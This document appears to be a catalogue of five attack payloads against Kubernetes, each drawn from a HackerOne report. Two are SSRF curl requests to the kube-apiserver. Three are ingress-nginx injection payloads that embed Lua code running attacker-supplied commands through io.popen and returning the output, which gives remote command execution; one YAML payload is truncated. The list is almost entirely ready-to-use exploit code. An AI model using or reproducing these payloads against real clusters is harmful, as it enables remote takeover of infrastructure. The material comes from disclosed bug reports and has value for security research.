# Kubernetes

5 payloads.

### `22315853`

```
curl -XPUT --data "10" http://localhost:8001/debug/flags/v
```

— [SSRF for kube-apiserver cloudprovider scene](https://hackerone.com/reports/941178) · Kubernetes · [lazydog](https://hackerone.com/lazydog)

### `c41e68c0`

```
curl http://localhost:8001/logs/target.com
```

— [SSRF for kube-apiserver cloudprovider scene](https://hackerone.com/reports/941178) · Kubernetes · [lazydog](https://hackerone.com/lazydog)

### `20c5dd08`

```
curl localhost/z/ -H "host: x.x" -H 'x-ginoah: content_by_lua_block {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd = post_args["cmd"];if cmd then f_ret = io.popen(cmd);local ret = f_ret:read("*a");ngx.say(string.format("%s", ret));end;}'
```

— [RCE  on ingress-nginx-controller via Ingress spec.rules.http.paths.path field](https://hackerone.com/reports/1620702) · Kubernetes · [ginoah](https://hackerone.com/ginoah) · $2,500.0

### `221ddd04`

```
cat > su.yml<<EOF
apiVersion: target.com/v1
kind: Ingress
metadata:
  name: ingress-exploit
  annotations:
    evil.com/ingress.class: "nginx"
    evil2.com/configuration-snippet: |
      more_set_headers "suanve"
            proxy_pass http://upstream_balancer;
                                proxy_redirect                          off;
        }
        location /suanve/ { content_by_lua_block { local rsfile = io.popen(ngx.req.get_headers()["cmd"]);local rschar = 
```

— [Ingress nginx annotation injection causes arbitrary command execution](https://hackerone.com/reports/1728174) · Kubernetes · [suanve](https://hackerone.com/suanve) · $2,500.0

### `9c181d7b`

```
set_by_lua_block $my_var { 
            local rsfile = io.popen(ngx.req.get_headers()["pathinjection"]);
            local rschar = rsfile:read("*all");ngx.say(rschar); 
            return rschar;
} 
proxy_set_header X-My-Var $my_var;
```

— [Injection in path parameter of Ingress-nginx](https://hackerone.com/reports/2701701) · Kubernetes · [fisjkars](https://hackerone.com/fisjkars)
